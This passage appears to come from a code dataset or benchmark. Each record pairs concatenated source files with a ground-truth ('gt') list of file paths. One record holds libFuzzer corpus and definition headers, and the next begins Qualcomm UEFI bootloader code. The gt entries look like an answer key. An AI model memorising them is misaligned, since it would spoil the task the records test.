assert(!II.U.empty());\n    return II;\n  }\n\n\n  size_t ChooseUnitIdxToMutate(Random &Rand) {\n    size_t Idx = static_cast<size_t>(CorpusDistribution(Rand));\n    assert(Idx < Inputs.size());\n    return Idx;\n  }\n\n  void PrintStats() {\n    for (size_t i = 0; i < Inputs.size(); i++) {\n      const auto &II = *Inputs[i];\n      Printf(\"  [% 3zd %s] sz: % 5zd runs: % 5zd succ: % 5zd focus: %d\\n\", i,\n             Sha1ToString(II.Sha1).c_str(), II.U.size(),\n             II.NumExecutedMutations, II.NumSuccessfullMutations, II.HasFocusFunction);\n    }\n  }\n\n  void PrintFeatureSet() {\n    for (size_t i = 0; i < kFeatureSetSize; i++) {\n      if(size_t Sz = GetFeature(i))\n        Printf(\"[%zd: id %zd sz%zd] \", i, SmallestElementPerFeature[i], Sz);\n    }\n    Printf(\"\\n\\t\");\n    for (size_t i = 0; i < Inputs.size(); i++)\n      if (size_t N = Inputs[i]->NumFeatures)\n        Printf(\" %zd=>%zd \", i, N);\n    Printf(\"\\n\");\n  }\n\n  void DeleteFile(const InputInfo &II) {\n    if (!OutputCorpus.empty() && II.MayDeleteFile)\n      RemoveFile(DirPlusFile(OutputCorpus, Sha1ToString(II.Sha1)));\n  }\n\n  void DeleteInput(size_t Idx) {\n    InputInfo &II = *Inputs[Idx];\n    DeleteFile(II);\n    Unit().swap(II.U);\n    if (FeatureDebug)\n      Printf(\"EVICTED %zd\\n\", Idx);\n  }\n\n  bool AddFeature(size_t Idx, uint32_t NewSize, bool Shrink) {\n    assert(NewSize);\n    Idx = Idx % kFeatureSetSize;\n    uint32_t OldSize = GetFeature(Idx);\n    if (OldSize == 0 || (Shrink && OldSize > NewSize)) {\n      if (OldSize > 0) {\n        size_t OldIdx = SmallestElementPerFeature[Idx];\n        InputInfo &II = *Inputs[OldIdx];\n        assert(II.NumFeatures > 0);\n        II.NumFeatures--;\n        if (II.NumFeatures == 0)\n          DeleteInput(OldIdx);\n      } else {\n        NumAddedFeatures++;\n      }\n      NumUpdatedFeatures++;\n      if (FeatureDebug)\n        Printf(\"ADD FEATURE %zd sz %d\\n\", Idx, NewSize);\n      SmallestElementPerFeature[Idx] = Inputs.size();\n      InputSizesPerFeature[Idx] = NewSize;\n      return true;\n    }\n    return false;\n  }\n\n  size_t NumFeatures() const { return NumAddedFeatures; }\n  size_t NumFeatureUpdates() const { return NumUpdatedFeatures; }\n\nprivate:\n\n  static const bool FeatureDebug = false;\n\n  size_t GetFeature(size_t Idx) const { return InputSizesPerFeature[Idx]; }\n\n  void ValidateFeatureSet() {\n    if (FeatureDebug)\n      PrintFeatureSet();\n    for (size_t Idx = 0; Idx < kFeatureSetSize; Idx++)\n      if (GetFeature(Idx))\n        Inputs[SmallestElementPerFeature[Idx]]->Tmp++;\n    for (auto II: Inputs) {\n      if (II->Tmp != II->NumFeatures)\n        Printf(\"ZZZ %zd %zd\\n\", II->Tmp, II->NumFeatures);\n      assert(II->Tmp == II->NumFeatures);\n      II->Tmp = 0;\n    }\n  }\n\n\n\n\n\n\n\n  void UpdateCorpusDistribution() {\n    size_t N = Inputs.size();\n    assert(N);\n    Intervals.resize(N + 1);\n    Weights.resize(N);\n    std::iota(Intervals.begin(), Intervals.end(), 0);\n    for (size_t i = 0; i < N; i++)\n      Weights[i] = Inputs[i]->NumFeatures\n                       ? (i + 1) * (Inputs[i]->HasFocusFunction ? 1000 : 1)\n                       : 0.;\n    if (FeatureDebug) {\n      for (size_t i = 0; i < N; i++)\n        Printf(\"%zd \", Inputs[i]->NumFeatures);\n      Printf(\"SCORE\\n\");\n      for (size_t i = 0; i < N; i++)\n        Printf(\"%f \", Weights[i]);\n      Printf(\"Weights\\n\");\n    }\n    CorpusDistribution = std::piecewise_constant_distribution<double>(\n        Intervals.begin(), Intervals.end(), Weights.begin());\n  }\n  std::piecewise_constant_distribution<double> CorpusDistribution;\n\n  Vector<double> Intervals;\n  Vector<double> Weights;\n\n  std::unordered_set<std::string> Hashes;\n  Vector<InputInfo*> Inputs;\n\n  size_t NumAddedFeatures = 0;\n  size_t NumUpdatedFeatures = 0;\n  uint32_t InputSizesPerFeature[kFeatureSetSize];\n  uint32_t SmallestElementPerFeature[kFeatureSetSize];\n\n  std::string OutputCorpus;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDefs.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DEFS_H\n#define LLVM_FUZZER_DEFS_H\n\n#include <cassert>\n#include <cstddef>\n#include <cstdint>\n#include <cstring>\n#include <memory>\n#include <set>\n#include <string>\n#include <vector>\n\n\n\n#ifdef __linux__\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 1\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 0\n#elif __APPLE__\n#define LIBFUZZER_APPLE 1\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 0\n#elif __NetBSD__\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 1\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 0\n#elif __FreeBSD__\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 1\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 0\n#elif __OpenBSD__\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 1\n#define LIBFUZZER_WINDOWS 0\n#elif _WIN32\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 0\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 1\n#elif __Fuchsia__\n#define LIBFUZZER_APPLE 0\n#define LIBFUZZER_FUCHSIA 1\n#define LIBFUZZER_LINUX 0\n#define LIBFUZZER_NETBSD 0\n#define LIBFUZZER_FREEBSD 0\n#define LIBFUZZER_OPENBSD 0\n#define LIBFUZZER_WINDOWS 0\n#else\n#error \"Support for your platform has not been implemented\"\n#endif\n\n#if defined(_MSC_VER) && !defined(__clang__)\n\n#define LIBFUZZER_MSVC 1\n#else\n#define LIBFUZZER_MSVC 0\n#endif\n\n#ifndef __has_attribute\n#  define __has_attribute(x) 0\n#endif\n\n#define LIBFUZZER_POSIX                                                        \\\n  (LIBFUZZER_APPLE || LIBFUZZER_LINUX || LIBFUZZER_NETBSD ||                   \\\n   LIBFUZZER_FREEBSD || LIBFUZZER_OPENBSD)\n\n#ifdef __x86_64\n#  if __has_attribute(target)\n#    define ATTRIBUTE_TARGET_POPCNT __attribute__((target(\"popcnt\")))\n#  else\n#    define ATTRIBUTE_TARGET_POPCNT\n#  endif\n#else\n#  define ATTRIBUTE_TARGET_POPCNT\n#endif\n\n\n#ifdef __clang__\n#  if __has_attribute(no_sanitize)\n#    define ATTRIBUTE_NO_SANITIZE_MEMORY __attribute__((no_sanitize(\"memory\")))\n#  else\n#    define ATTRIBUTE_NO_SANITIZE_MEMORY\n#  endif\n#  define ALWAYS_INLINE __attribute__((always_inline))\n#else\n#  define ATTRIBUTE_NO_SANITIZE_MEMORY\n#  define ALWAYS_INLINE\n#endif\n\n#if LIBFUZZER_WINDOWS\n#define ATTRIBUTE_NO_SANITIZE_ADDRESS\n#else\n#define ATTRIBUTE_NO_SANITIZE_ADDRESS __attribute__((no_sanitize_address))\n#endif\n\n#if LIBFUZZER_WINDOWS\n#define ATTRIBUTE_ALIGNED(X) __declspec(align(X))\n#define ATTRIBUTE_INTERFACE __declspec(dllexport)\n\n\n\n#define ATTRIBUTES_INTERFACE_TLS_INITIAL_EXEC static\n#define ATTRIBUTE_NOINLINE __declspec(noinline)\n#else\n#define ATTRIBUTE_ALIGNED(X) __attribute__((aligned(X)))\n#define ATTRIBUTE_INTERFACE __attribute__((visibility(\"default\")))\n#define ATTRIBUTES_INTERFACE_TLS_INITIAL_EXEC \\\n  ATTRIBUTE_INTERFACE __attribute__((tls_model(\"initial-exec\"))) thread_local\n\n#define ATTRIBUTE_NOINLINE __attribute__((noinline))\n#endif\n\n#if defined(__has_feature)\n#  if __has_feature(address_sanitizer)\n#    define ATTRIBUTE_NO_SANITIZE_ALL ATTRIBUTE_NO_SANITIZE_ADDRESS\n#  elif __has_feature(memory_sanitizer)\n#    define ATTRIBUTE_NO_SANITIZE_ALL ATTRIBUTE_NO_SANITIZE_MEMORY\n#  else\n#    define ATTRIBUTE_NO_SANITIZE_ALL\n#  endif\n#else\n#  define ATTRIBUTE_NO_SANITIZE_ALL\n#endif\n\nnamespace fuzzer {\n\ntemplate <class T> T Min(T a, T b) { return a < b ? a : b; }\ntemplate <class T> T Max(T a, T b) { return a > b ? a : b; }\n\nclass Random;\nclass Dictionary;\nclass DictionaryEntry;\nclass MutationDispatcher;\nstruct FuzzingOptions;\nclass InputCorpus;\nstruct InputInfo;\nstruct ExternalFunctions;\n\n\nextern ExternalFunctions *EF;\n\n\n\ntemplate<typename T>\n  class fuzzer_allocator: public std::allocator<T> {\n    public:\n      fuzzer_allocator() = default;\n\n      template<class U>\n      fuzzer_allocator(const fuzzer_allocator<U>&) {}\n\n      template<class Other>\n      struct rebind { typedef fuzzer_allocator<Other> other;  };\n  };\n\ntemplate<typename T>\nusing Vector = std::vector<T, fuzzer_allocator<T>>;\n\ntemplate<typename T>\nusing Set = std::set<T, std::less<T>, fuzzer_allocator<T>>;\n\ntypedef Vector<uint8_t> Unit;\ntypedef Vector<Unit> UnitVector;\ntypedef int (*UserCallback)(const uint8_t *Data, size_t Size);\n\nint FuzzerDriver(int *argc, char ***argv, UserCallback Callback);\n\nuint8_t *ExtraCountersBegin();\nuint8_t *ExtraCountersEnd();\nvoid ClearExtraCounters();\n\nextern bool RunningUserCallback;\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDataFlowTrace.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DATA_FLOW_TRACE\n#define LLVM_FUZZER_DATA_FLOW_TRACE\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n\n#include <unordered_map>\n#include <unordered_set>\n#include <vector>\n#include <string>\n\nnamespace fuzzer {\n\nint CollectDataFlow(const std::string &DFTBinary, const std::string &DirPath,\n                    const Vector<SizedFile> &CorporaFiles);\n\nclass BlockCoverage {\n public:\n  bool AppendCoverage(std::istream &IN);\n  bool AppendCoverage(const std::string &S);\n\n  size_t NumCoveredFunctions() const { return Functions.size(); }\n\n  uint32_t GetCounter(size_t FunctionId, size_t BasicBlockId) {\n    auto It = Functions.find(FunctionId);\n    if (It == Functions.end()) return 0;\n    const auto &Counters = It->second;\n    if (BasicBlockId < Counters.size())\n      return Counters[BasicBlockId];\n    return 0;\n  }\n\n  uint32_t GetNumberOfBlocks(size_t FunctionId) {\n    auto It = Functions.find(FunctionId);\n    if (It == Functions.end()) return 0;\n    const auto &Counters = It->second;\n    return Counters.size();\n  }\n\n  uint32_t GetNumberOfCoveredBlocks(size_t FunctionId) {\n    auto It = Functions.find(FunctionId);\n    if (It == Functions.end()) return 0;\n    const auto &Counters = It->second;\n    uint32_t Result = 0;\n    for (auto Cnt: Counters)\n      if (Cnt)\n        Result++;\n    return Result;\n  }\n\n  Vector<double> FunctionWeights(size_t NumFunctions) const;\n  void clear() { Functions.clear(); }\n\n private:\n\n  typedef Vector<uint32_t> CoverageVector;\n\n  uint32_t NumberOfCoveredBlocks(const CoverageVector &Counters) const {\n    uint32_t Res = 0;\n    for (auto Cnt : Counters)\n      if (Cnt)\n        Res++;\n    return Res;\n  }\n\n  uint32_t NumberOfUncoveredBlocks(const CoverageVector &Counters) const {\n    return Counters.size() - NumberOfCoveredBlocks(Counters);\n  }\n\n  uint32_t SmallestNonZeroCounter(const CoverageVector &Counters) const {\n    assert(!Counters.empty());\n    uint32_t Res = Counters[0];\n    for (auto Cnt : Counters)\n      if (Cnt)\n        Res = Min(Res, Cnt);\n    assert(Res);\n    return Res;\n  }\n\n\n\n  std::unordered_map<size_t, CoverageVector> Functions;\n\n  std::unordered_set<size_t> FunctionsWithDFT;\n};\n\nclass DataFlowTrace {\n public:\n  void ReadCoverage(const std::string &DirPath);\n  bool Init(const std::string &DirPath, std::string *FocusFunction,\n            Vector<SizedFile> &CorporaFiles, Random &Rand);\n  void Clear() { Traces.clear(); }\n  const Vector<uint8_t> *Get(const std::string &InputSha1) const {\n    auto It = Traces.find(InputSha1);\n    if (It != Traces.end())\n      return &It->second;\n    return nullptr;\n  }\n\n private:\n\n  std::unordered_map<std::string, Vector<uint8_t> > Traces;\n  BlockCoverage Coverage;\n  std::unordered_set<std::string> CorporaHashes;\n};\n}\n\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDefs.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDataFlowTrace.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/LocateDeviceTree.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/fdtcompat.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/LocateDeviceTree.h'\n:\n\n\n#ifndef __LOCATEDEVICETREE_H__\n#define __LOCATEDEVICETREE_H__\n\n#include \"Board.h\"\n#include \"libfdt.h\"\n#include \"list.h\"\n#include <Library/fdtcompat.h>\n#include <Library/BootLinux.h>\n#include <Library/DebugLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/VerifiedBoot.h>\n#include <Protocol/EFIChipInfo.h>\n#include <Protocol/EFIPlatformInfo.h>\n#include <Protocol/EFIPmicVersion.h>\n#include <Uefi.h>\n\n#define DEV_TREE_SUCCESS 0\n#define DEV_TREE_MAGIC 0x54444351\n#define DEV_TREE_MAGIC_LEN 4\n#define DEV_TREE_VERSION_V1 1\n#define DEV_TREE_VERSION_V2 2\n#define DEV_TREE_VERSION_V3 3\n\n#define DEV_TREE_HEADER_SIZE 12\n#define DEVICE_TREE_IMAGE_OFFSET 0x5F8800\n\n#define DTB_MAGIC 0xedfe0dd0\n#define DTB_OFFSET 0X2C\n\n#define DTB_PAD_SIZE 2048\n#define DTBO_TABLE_MAGIC 0xD7B7AB1E\n#define DTBO_CUSTOM_MAX 4\n#define PLATFORM_FOUNDRY_SHIFT 16\n#define DTBO_MAX_SIZE_ALLOWED (24 * 1024 * 1024)\n#define SOC_MASK (0xffff)\n#define VARIANT_MASK (0x000000ff)\n#define VARIANT_MINOR_MASK (0x0000ff00)\n#define VARIANT_MAJOR_MASK (0x00ff0000)\n#define PMIC_MODEL_MASK (0x000000ff)\n#define PMIC_REV_MASK (0xffffff00)\n#define PMIC_SHIFT_IDX (2)\n#define PLATFORM_SUBTYPE_SHIFT_ID (0x18)\n#define FOUNDRY_ID_MASK (0x00ff0000)\n#define PLATFORM_SUBTYPE_MASK (0x000000ff)\n#define DDR_MASK (0x00000700)\n\ntypedef enum {\n  NONE_MATCH,\n  PMIC_MATCH_BEST_REV_IDX0,\n  PMIC_MATCH_EXACT_REV_IDX0,\n  PMIC_MATCH_BEST_REV_IDX1,\n  PMIC_MATCH_EXACT_REV_IDX1,\n  PMIC_MATCH_BEST_REV_IDX2,\n  PMIC_MATCH_EXACT_REV_IDX2,\n  PMIC_MATCH_BEST_REV_IDX3,\n  PMIC_MATCH_EXACT_REV_IDX3,\n  VARIANT_MINOR_BEST_MATCH,\n  VARIANT_MINOR_EXACT_MATCH,\n  VARIANT_MAJOR_BEST_MATCH,\n  VARIANT_MAJOR_EXACT_MATCH,\n  VERSION_BEST_MATCH,\n  VERSION_EXACT_MATCH,\n  FOUNDRYID_DEFAULT_MATCH,\n  FOUNDRYID_EXACT_MATCH,\n  PMIC_MATCH_DEFAULT_MODEL_IDX0,\n  PMIC_MATCH_EXACT_MODEL_IDX0,\n  PMIC_MATCH_DEFAULT_MODEL_IDX1,\n  PMIC_MATCH_EXACT_MODEL_IDX1,\n  PMIC_MATCH_DEFAULT_MODEL_IDX2,\n  PMIC_MATCH_EXACT_MODEL_IDX2,\n  PMIC_MATCH_DEFAULT_MODEL_IDX3,\n  PMIC_MATCH_EXACT_MODEL_IDX3,\n  PMIC_MATCH_DEFAULT_MODEL_IDX4,\n  PMIC_MATCH_EXACT_MODEL_IDX4,\n  PMIC_MATCH_DEFAULT_MODEL_IDX5,\n  PMIC_MATCH_EXACT_MODEL_IDX5,\n  PMIC_MATCH_DEFAULT_MODEL_IDX6,\n  PMIC_MATCH_EXACT_MODEL_IDX6,\n  PMIC_MATCH_DEFAULT_MODEL_IDX7,\n  PMIC_MATCH_EXACT_MODEL_IDX7,\n  PMIC_MATCH_DEFAULT_MODEL_IDX8,\n  PMIC_MATCH_EXACT_MODEL_IDX8,\n  PMIC_MATCH_DEFAULT_MODEL_IDX9,\n  PMIC_MATCH_EXACT_MODEL_IDX9,\n  PMIC_MATCH_DEFAULT_MODEL_IDXA,\n  PMIC_MATCH_EXACT_MODEL_IDXA,\n  PMIC_MATCH_DEFAULT_MODEL_IDXB,\n  PMIC_MATCH_EXACT_MODEL_IDXB,\n  PMIC_MATCH_DEFAULT_MODEL_IDXC,\n  PMIC_MATCH_EXACT_MODEL_IDXC,\n  PMIC_MATCH_DEFAULT_MODEL_IDXD,\n  PMIC_MATCH_EXACT_MODEL_IDXD,\n  PMIC_MATCH_DEFAULT_MODEL_IDXE,\n  PMIC_MATCH_EXACT_MODEL_IDXE,\n  PMIC_MATCH_DEFAULT_MODEL_IDXF,\n  PMIC_MATCH_EXACT_MODEL_IDXF,\n  SOFTSKU_EXACT_MATCH,\n  SUBTYPE_DEFAULT_MATCH,\n  SUBTYPE_EXACT_MATCH,\n  DDR_MATCH,\n  VARIANT_MATCH,\n  SOC_MATCH,\n  MAX_MATCH,\n} DTMATCH_PARAMS;\n\n#define TOTAL_MATCH_BITS 6\n#define ALL_BITS_SET                                                       \\\n  (BIT (SOC_MATCH) | BIT (VARIANT_MATCH) | BIT (SUBTYPE_EXACT_MATCH) |     \\\n   BIT (FOUNDRYID_EXACT_MATCH) | BIT (PMIC_MATCH_EXACT_MODEL_IDX0) |       \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDX1) | BIT (PMIC_MATCH_EXACT_MODEL_IDX2) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDX3) | BIT (PMIC_MATCH_EXACT_MODEL_IDX4) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDX5) | BIT (PMIC_MATCH_EXACT_MODEL_IDX6) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDX7) | BIT (PMIC_MATCH_EXACT_MODEL_IDX8) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDX9) | BIT (PMIC_MATCH_EXACT_MODEL_IDXA) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDXB) | BIT (PMIC_MATCH_EXACT_MODEL_IDXC) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDXD) | BIT (PMIC_MATCH_EXACT_MODEL_IDXE) | \\\n   BIT (PMIC_MATCH_EXACT_MODEL_IDXF) | BIT (SOFTSKU_EXACT_MATCH))\n\ntypedef enum {\n  PMIC_IDX0,\n  PMIC_IDX1,\n  PMIC_IDX2,\n  PMIC_IDX3,\n  PMIC_IDX4,\n  MAX_PMIC_IDX = 0xF,\n} PMIC_INDEXES;\n\ntypedef struct PmicIdInfo {\n  UINT32 DtPmicModel[MAX_PMIC_IDX];\n  UINT32 DtPmicRev[MAX_PMIC_IDX];\n  UINT64 DtMatchVal;\n} PmicIdInfo;\n\ntypedef struct DtInfo {\n  UINT32 DtPlatformId;\n  UINT32 DtSocRev;\n  UINT32 DtFoundryId;\n  UINT32 DtVariantId;\n  UINT32 DtVariantMajor;\n  UINT32 DtVariantMinor;\n  UINT32 DtPlatformSubtype;\n  UINT32 DtSoftSkuId;\n  UINT32 DtPmicModel[MAX_PMIC_IDX];\n  UINT32 DtPmicRev[MAX_PMIC_IDX];\n  UINT64 DtMatchVal;\n  VOID *Dtb;\n} DtInfo;\n\n\n#define DT_ENTRY_V1_SIZE 0xC\n\n\nstruct dt_entry {\n  UINT32 platform_id;\n  UINT32 variant_id;\n  UINT32 board_hw_subtype;\n  UINT32 soc_rev;\n  UINT32 pmic_rev[4];\n  UINT64 offset;\n  UINT32 size;\n  UINT32 Idx;\n  UINT32 SkuId;\n};\n\n\nstruct dt_entry_v1 {\n  UINT32 platform_id;\n  UINT32 variant_id;\n  UINT32 soc_rev;\n  UINT32 offset;\n  UINT32 size;\n};\n\n\nstruct dt_entry_v2 {\n  UINT32 platform_id;\n  UINT32 variant_id;\n  UINT32 board_hw_subtype;\n  UINT32 soc_rev;\n  UINT32 offset;\n  UINT32 size;\n};\n\n\nstruct dt_table {\n  UINT32 magic;\n  UINT32 version;\n  UINT32 num_entries;\n};\n\nstruct plat_id {\n  UINT32 platform_id;\n  UINT32 soc_rev;\n};\n\nstruct board_id {\n  UINT32 variant_id;\n  UINT32 platform_subtype;\n};\n\nstruct pmic_id {\n  UINT32 pmic_version[4];\n};\n\ntypedef struct softsku_id {\n  UINT32 SkuId;\n} softsku_id;\n\n#define PLAT_ID_SIZE    sizeof (struct plat_id)\n#define BOARD_ID_SIZE   sizeof (struct board_id)\n#define PMIC_ID_SIZE    sizeof (struct pmic_id)\n\nstruct dt_mem_node_info {\n  UINT32 offset;\n  UINT32 mem_info_cnt;\n  UINT32 addr_cell_size;\n  UINT32 size_cell_size;\n};\n\nenum dt_entry_info {\n  DTB_FOUNDRY = 0,\n  DTB_DDR,\n  DTB_SOC,\n  DTB_MAJOR_MINOR,\n  DTB_PMIC0,\n  DTB_PMIC1,\n  DTB_PMIC2,\n  DTB_PMIC3,\n  DTB_PMIC_MODEL,\n  DTB_PANEL_TYPE,\n  DTB_BOOT_DEVICE,\n};\n\nenum dt_err_codes {\n  DT_OP_SUCCESS,\n  DT_OP_FAILURE = -1,\n};\n\ntypedef struct dt_entry_node {\n  struct list_node node;\n  struct dt_entry *dt_entry_m;\n} dt_node;\n\nstruct DtboTableHdr {\n  UINT32 Magic;\n  UINT32 TotalSize;\n  UINT32 HeaderSize;\n  UINT32 DtEntrySize;\n  UINT32 DtEntryCount;\n  UINT32 DtEntryOffset;\n  UINT32 PageSize;\n  UINT32 Reserved[1];\n};\n\nstruct DtboTableEntry {\n  UINT32 DtSize;\n  UINT32 DtOffset;\n  UINT32 Id;\n  UINT32 Rev;\n  UINT32 Custom[DTBO_CUSTOM_MAX];\n};\n\nVOID *\nDeviceTreeAppended (void *kernel,\n                    UINT32 kernel_size,\n                    UINT32 dtb_offset,\n                    void *tags);\nVOID *\nGetSocDtb (void *kernel, UINT32 kernel_size, UINT32 dtb_offset, void *tags);\nBOOLEAN GetDtboNeeded (VOID);\nVOID *\nGetBoardDtb (BootInfo *Info, VOID *DtboImgBuffer);\nEFI_STATUS\nGetOvrdDtb (VOID **DtboImgBuffer);\nVOID\nPopulateBoardParams ();\n\nint\nDeviceTreeValidate (UINT8 *DeviceTreeBuff,\n                    UINT32 PageSize,\n                    UINT32 *DeviceTreeSize);\nINT32 GetDtboIdx (VOID);\nINT32 GetDtbIdx (VOID);\nVOID DeleteDtList (struct fdt_entry_node** DtList);\nBOOLEAN AppendToDtList (struct fdt_entry_node **DtList,\n                UINT64 Address,\n                UINT64 Size);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'\n:\n\n#include \"AutoGen.h\"\n#include \"BootLinux.h\"\n#include \"BootStats.h\"\n#include \"KeyPad.h\"\n#include \"LinuxLoaderLib.h\"\n#include <Protocol/DiskIo.h>\n#include <Protocol/EFIDisplayUtils.h>\n#include <FastbootLib/FastbootMain.h>\n#include <Library/DeviceInfo.h>\n#include <Library/DrawUI.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PartitionTableUpdate.h>\n#include <Library/ShutdownServices.h>\n#include <Library/StackCanary.h>\n#include \"Library/ThreadStack.h\"\n#include <Library/HypervisorMvCalls.h>\n#include <Library/UpdateCmdLine.h>\n\n#define MAX_APP_STR_LEN 64\n#define MAX_NUM_FS 10\n#define DEFAULT_STACK_CHK_GUARD 0xc0c0c0c0\n\nSTATIC BOOLEAN BootReasonAlarm = FALSE;\nSTATIC BOOLEAN BootIntoFastboot = FALSE;\nSTATIC BOOLEAN BootIntoRecovery = FALSE;\n\n\nSTATIC EFI_STATUS MdtpDisable (VOID)\n{\n  BOOLEAN MdtpActive = FALSE;\n  EFI_STATUS Status = EFI_SUCCESS;\n  QCOM_MDTP_PROTOCOL *MdtpProtocol;\n\n  if (FixedPcdGetBool (EnableMdtpSupport)) {\n    Status = IsMdtpActive (&MdtpActive);\n\n    if (EFI_ERROR (Status))\n      return Status;\n\n    if (MdtpActive) {\n      Status = gBS->LocateProtocol (&gQcomMdtpProtocolGuid, NULL,\n                                    (VOID **)&MdtpProtocol);\n      if (EFI_ERROR (Status)) {\n        DEBUG ((EFI_D_ERROR, \"Failed to locate MDTP protocol, Status=%r\\n\",\n                Status));\n        return Status;\n      }\n\n      Status = MdtpProtocol->MdtpDeactivate (MdtpProtocol, FALSE);\n    }\n  }\n\n  return Status;\n}\n\nSTATIC UINT8\nGetRebootReason (UINT32 *ResetReason)\n{\n  EFI_RESETREASON_PROTOCOL *RstReasonIf;\n  EFI_STATUS Status;\n\n  Status = gBS->LocateProtocol (&gEfiResetReasonProtocolGuid, NULL,\n                                (VOID **)&RstReasonIf);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error locating the reset reason protocol\\n\"));\n    return Status;\n  }\n\n  RstReasonIf->GetResetReason (RstReasonIf, ResetReason, NULL, NULL);\n  if (RstReasonIf->Revision >= EFI_RESETREASON_PROTOCOL_REVISION)\n    RstReasonIf->ClearResetReason (RstReasonIf);\n  return Status;\n}\n\nBOOLEAN IsABRetryCountUpdateRequired (VOID)\n{\n  BOOLEAN BatteryStatus;\n\n\n  TargetPauseForBatteryCharge (&BatteryStatus);\n\n\n  if ((BatteryStatus &&\n       IsChargingScreenEnable ()) ||\n       BootIntoFastboot ||\n       BootIntoRecovery) {\n    return FALSE;\n  }\n  return TRUE;\n}\n\n#if TARGET_BOARD_TYPE_AUTO\nSTATIC UINT8\nWaitForDisplayCompletion (VOID)\n{\n  EFI_STATUS Status;\n  EfiQcomDisplayUtilsProtocol *pDisplayUtilsProtocol = NULL;\n  CHAR8 *sLockName = \"DispInit\";\n\n  Status = gBS->LocateProtocol (&gQcomDisplayUtilsProtocolGuid,\n                                NULL,\n                                (VOID **)&pDisplayUtilsProtocol);\n  if ((EFI_ERROR (Status)) ||\n      (pDisplayUtilsProtocol == NULL)) {\n    DEBUG ((EFI_D_ERROR, \"Failed to locate DisplayUtils protocol, Status=%r\\n\",\n                Status));\n    return Status;\n  } else {\n    Status = pDisplayUtilsProtocol->DisplayUtilsSetProperty (\n                                     EFI_DISPLAY_UTILS_WAIT_FOR_EVENT,\n                                     sLockName, strlen (sLockName));\n  }\n\n  return Status;\n}\n#else\nSTATIC UINT8\nWaitForDisplayCompletion (VOID)\n{\n  return EFI_SUCCESS;\n}\n#endif\n\n\n\nEFI_STATUS EFIAPI  __attribute__ ( (no_sanitize (\"safe-stack\")))\nLinuxLoaderEntry (IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)\n{\n  EFI_STATUS Status;\n\n  UINT32 BootReason = NORMAL_MODE;\n  UINT32 KeyPressed = SCAN_NULL;\n\n  BOOLEAN MultiSlotBoot;\n\n  DEBUG ((EFI_D_INFO, \"Loader Build Info: %a %a\\n\", __DATE__, __TIME__));\n  DEBUG ((EFI_D_VERBOSE, \"LinuxLoader Load Address to debug ABL: 0x%llx\\n\",\n         (UINTN)LinuxLoaderEntry & (~ 